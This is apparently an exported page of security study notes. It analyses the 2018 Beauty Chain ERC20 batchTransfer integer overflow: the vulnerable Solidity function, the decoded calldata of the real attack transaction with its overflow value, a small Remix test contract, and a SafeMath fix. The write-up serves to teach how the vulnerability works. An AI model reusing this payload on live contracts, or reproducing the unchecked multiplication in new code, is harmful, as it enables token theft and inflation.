<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Real-World-Scenario: ERC20 Beauty Chain Batch Overflow 2018 </title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Real-World-Scenario: ERC20 Beauty Chain Batch Overflow 2018 </h1><br/><strong>This is a hyperinflation attack happened in 2018</strong><br /><br />A bunch of erc20 tokens incorrectly checked the results of mathematical calculations. This lack of safe checks led to exchanges freezing all erc20 token transfers. <br />The effected tokens in this attack used an insecure batch send function that was not protected from integer overflows. <br />This vulnerability was copy pasted into many different tokens and when exploited it forced exchanges to suspend all erc20 token transfers until the issue was resolved.<br /><br />Vulnerable function in the contract: <a href="https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code" target="_blank">https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code</a><br />    <div class="codebox"><div class="codebox">function&nbsp;batchTransfer(address[]&nbsp;_receivers,&nbsp;uint256&nbsp;_value)&nbsp;public&nbsp;whenNotPaused&nbsp;returns&nbsp;(bool)&nbsp;<span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;uint&nbsp;cnt&nbsp;=&nbsp;_receivers.length;<br />&nbsp;&nbsp;&nbsp;&nbsp;uint256&nbsp;amount&nbsp;=&nbsp;uint256(cnt)&nbsp;*&nbsp;_value;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&lt;--&nbsp;overflow&nbsp;vulnerability<br />&nbsp;&nbsp;&nbsp;&nbsp;require(cnt&nbsp;&gt;&nbsp;0&nbsp;&amp;&amp;&nbsp;cnt&nbsp;&lt;=&nbsp;20);<br />&nbsp;&nbsp;&nbsp;&nbsp;require(_value&nbsp;&gt;&nbsp;0&nbsp;&amp;&amp;&nbsp;balances[msg.sender]&nbsp;&gt;=&nbsp;amount);<br />&nbsp;&nbsp;&nbsp;&nbsp;balances[msg.sender]&nbsp;=&nbsp;balances[msg.sender].sub(amount);<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(uint&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;cnt;&nbsp;i++)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;balances[_receivers[i]]&nbsp;=&nbsp;balances[_receivers[i]].add(_value);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Transfer(msg.sender,&nbsp;_receivers[i],&nbsp;_value);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br />   ◇ The issue with this function is it’s performing a <code><span style="text-decoration:underline;">balances[msg.sender]</span></code><span style="text-decoration:underline;"> check against the </span><code><span style="text-decoration:underline;">amount</span></code><span style="text-decoration:underline;"> on line 5</span> but <span style="text-decoration:underline;">that </span><code><span style="text-decoration:underline;">amount</span></code><span style="text-decoration:underline;"> value comes from a mathematical operation on line 3 which has an overflow vulnerability</span>.<br />   ◇ In fact the <code>amount</code> results come from multiplying the length of the array(<code>_receivers.length</code>) times the <code>_value</code> that is sent to each receiver. Since <span style="text-decoration:underline;">there are no checks that this mathematical operation does not overflow to a value lower than our balance</span>, we can easily set the amount to 0 using a very large number as our <code>_value</code>.<br />   ◇ When the actual balances(<code>balances[_receivers[i]]</code> ) are updated on line 8, we are not using the amount of 0, but instead we are using the initial large <code>_value</code> sent to the function, but this time there is no multiplication, so it does not cause an overflow, it only updates the balances of the receivers to a very large number. <br /><br /><strong><span style="color:#ff0000;">Real Attack Transaction</span></strong><br />View the transaction on etherscan: <a href="https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f" target="_blank">https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f</a><br />    click to see more → input data<br />    <a href=""><img src="images/1410-1.png" alt="images/1410-1.png" /></a><br />    <div class="codebox"><div class="codebox">Function:&nbsp;batchTransfer(address[]&nbsp;_receivers,&nbsp;uint256&nbsp;_value)<br /><br />MethodID:&nbsp;0x83f12fec<br />[0]:&nbsp;&nbsp;0000000000000000000000000000000000000000000000000000000000000040&nbsp;&nbsp;//define&nbsp;that&nbsp;the&nbsp;array&nbsp;with&nbsp;its&nbsp;length&nbsp;start&nbsp;at&nbsp;position&nbsp;0x40&nbsp;=&nbsp;64&nbsp;bytes&nbsp;-&gt;&nbsp;[2]<br />[1]:&nbsp;&nbsp;8000000000000000000000000000000000000000000000000000000000000000&nbsp;&nbsp;//_value&nbsp;that&nbsp;we&nbsp;want&nbsp;to&nbsp;pass<br />[2]:&nbsp;&nbsp;0000000000000000000000000000000000000000000000000000000000000002&nbsp;&nbsp;//length&nbsp;of&nbsp;the&nbsp;array<br />[3]:&nbsp;&nbsp;000000000000000000000000b4d30cac5124b46c2df0cf3e3e1be05f42119033&nbsp;&nbsp;//receivers&nbsp;address&nbsp;1&nbsp;of&nbsp;the&nbsp;array<br />[4]:&nbsp;&nbsp;0000000000000000000000000e823ffe018727585eaf5bc769fa80472f76c3d7&nbsp;&nbsp;//receivers&nbsp;address&nbsp;2&nbsp;of&nbsp;the&nbsp;array</div></div><br />The data in the transaction can be broken down as the following<br />   ◇ <span style="text-decoration:underline;">MethodID</span> of 4 Byte (0x83f12fec)<br />      This value (0x83f12fec) come from by hashing the function “batchTransfer(address[],uint256)” with keccak-256. Note that the function to hash is without the variable names and spaces of the original one.<br />      It is the fist 4 byte of the hexadecimal value created (0x + 4 Byte), considering that each 2 digits of a hexadeciaml number is 1 Byte. <br />     We can calculate it by:<br />         - node commands on Linux(<a href="https://stackoverflow.com/questions/52664899/solidity-and-web3-sha3-methods-return-something-else" target="_blank">web3.utils.sha3 is an alias for keccak-256</a>):<br />             <div class="codebox"><div class="codebox">root@kali:/#&nbsp;npm&nbsp;install&nbsp;web3<br />root@kali:/#&nbsp;node<br />&gt;&nbsp;const&nbsp;web3&nbsp;=&nbsp;require(&#39;web3&#39;)<br />&gt;&nbsp;web3.utils.sha3(&quot;batchTransfer(address[],uint256)&quot;).substring<span style="color:#000000;font-weight:400">(</span>0,10<span style="color:#000000;font-weight:400">)</span></div></div><br />            <a href=""><img src="images/1410-2.png" alt="images/1410-2.png" /></a><br />         - use an <a href="https://emn178.github.io/online-tools/keccak_256.html" target="_blank">online Tool</a> and then take the first 4 Bytes(8 digits)<br />   ◇ <span style="text-decoration:underline;">Five 32-byte values</span> (0,1,2,3,4)<br />   When we have an array in a function, we have to pass to it <br />      ▪ [0] Offset to the <code>_recievers</code> Array, point to the 64th (0x40) Byte [2]. If you look at the 64th byte, it is the beginning of our array. The first 32 bytes [2] is the length (0x02), followed by the two addresses on line [3] and [4]<br />      ▪ [1] This is the actual <code>_value</code> which is being sent that when multiplied causes an overflow. (A very large number)<br />      ▪ [2] This is the size of the <code>_recievers</code> array sent to batch transfer in this case 2 addresses (0x02)<br />      ▪ [3] This is the first address from the <code>_recievers</code> array used in the batch transfer.<br />      ▪ [4] This is the second address from the <code>_recievers</code> array used in the batch transfer.<br /><br /><strong>Why is been chosen </strong><strong><span style="color:#ff0000;">0x8000000000000000000000000000000000000000000000000000000000000000</span></strong><strong>  as </strong><strong><code>_value</code></strong><strong> ?</strong><br />Because as we have seen <a href="Home--Blockchain_and_Smart_Contracts_Exploitation--Solidity--2._State_Variables_&_Integers.html">here</a> uint256 need to a value strictly &lt; 0x10000000000000000000000000000000000000000000000000000000000000000 otherwise it goin overflow.<br />To reach this value, we cannot insert directly this number because it would give us directly an error of “value out-of-bounds”. <br />To test the overflow, we can use this small script in the IDE <a href="http://remix.ethereum.org/">http://remix.ethereum.org/</a><br />    <div class="codebox"><div class="codebox">pragma&nbsp;solidity&nbsp;^0.6.6;<br />&nbsp;&nbsp;<br />contract&nbsp;noAuth&nbsp;<span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;amount(uint256&nbsp;myAmount)&nbsp;public&nbsp;returns(uint){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;myAmount&nbsp;*&nbsp;2;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//or&nbsp;*4&nbsp;like&nbsp;in&nbsp;the&nbsp;other&nbsp;example&nbsp;below<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br />• With an array of length 2, we can use 1/2 of the value so <span style="color:#ff0000;">0x8000000000000000000000000000000000000000000000000000000000000000</span><br />    <a href=""><img src="images/1410-3.png" alt="images/1410-3.png" /></a><br />    <a href=""><img src="images/1410-4.png" alt="images/1410-4.png" /></a><br />• With an array of length 4, we can use 1/4 of the value so 0x4000000000000000000000000000000000000000000000000000000000000000<br />    <a href=""><img src="images/1410-5.png" alt="images/1410-5.png" /></a><br />    <a href=""><img src="images/1410-6.png" alt="images/1410-6.png" /></a><br />  <br /><br /><strong><h3>Fix the vulnerability</h3></strong><br />For older versions of solidity (<a href="https://soliditydeveloper.com/solidity-0.8#:~:text=Integrated%20SafeMath" target="_blank">&lt;0.8</a>) we need to use the <a href="https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol" target="_blank">SafeMath library</a>.<br />In the subchapter (<a href="ws--Transfer_Function_Vulnerable_to_a_Batch_Overflow--Real-World-Scenario_ERC20_Beauty_Chain_Batch_Overflow_2018--Test_locally_the_Attack.html">Test locally the Attack</a>), we have tested and fixed the vulnerability locally, Check it!<br /><div class="codebox"><div class="codebox">pragma&nbsp;solidity&nbsp;0.6.6;<br />import&nbsp;&quot;https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol&quot;;</div></div><br /><br /><div class="codebox"><div class="codebox">function&nbsp;batchTransfer(address[]&nbsp;_receivers,&nbsp;uint256&nbsp;_value)&nbsp;public&nbsp;whenNotPaused&nbsp;returns&nbsp;(bool)&nbsp;<span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;uint&nbsp;cnt&nbsp;=&nbsp;_receivers.length;<br />&nbsp;&nbsp;&nbsp;&nbsp;uint256&nbsp;amount&nbsp;=&nbsp;SafeMath.mul(uint256(cnt),&nbsp;_value);&nbsp;&nbsp;//&lt;--<br />&nbsp;&nbsp;&nbsp;&nbsp;require(cnt&nbsp;&gt;&nbsp;0&nbsp;&amp;&amp;&nbsp;cnt&nbsp;&lt;=&nbsp;20);<br />&nbsp;&nbsp;&nbsp;&nbsp;require(_value&nbsp;&gt;&nbsp;0&nbsp;&amp;&amp;&nbsp;balances[msg.sender]&nbsp;&gt;=&nbsp;amount);<br />&nbsp;&nbsp;&nbsp;&nbsp;balances[msg.sender]&nbsp;=&nbsp;SafeMath.sub(balances[msg.sender],&nbsp;&nbsp;amount);&nbsp;&nbsp;//&lt;--<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(uint&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;cnt;&nbsp;i++)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;balances[_receivers[i]]&nbsp;=&nbsp;SafeMath.add(balances[_receivers[i]],&nbsp;&nbsp;_value);&nbsp;&nbsp;//&lt;--<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Transfer(msg.sender,&nbsp;_receivers[i],&nbsp;_value);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br />                                                                       <br /><br /><br /><br />Bibliography:<br />• <a href="http://console-cowboys.blogspot.com/2020/08/smart-contract-hacking-chapter-3.html" target="_blank">http://console-cowboys.blogspot.com/2020/08/smart-contract-hacking-chapter-3.html</a></div>
</body>
</html>
